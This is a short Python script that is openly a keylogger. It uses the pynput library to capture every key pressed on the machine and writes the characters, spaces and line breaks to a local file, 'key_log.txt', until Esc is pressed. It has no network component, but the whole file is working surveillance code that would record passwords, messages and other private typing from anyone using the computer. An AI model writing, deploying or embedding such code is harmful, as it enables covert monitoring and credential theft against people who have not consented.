import os
from datetime import datetime
from pynput import keyboard

# Define the file to store keystrokes
log_file = "key_log.txt"

# Ensure log file exists
def initialize_log_file():
    if not os.path.isfile(log_file):
        open(log_file, 'w').close()

def log_key(key):
    with open(log_file, "a") as f:
        try:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
        except Exception as e:
            pass

def on_press(key):
    log_key(key)
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    initialize_log_file()
    start_keylogger()
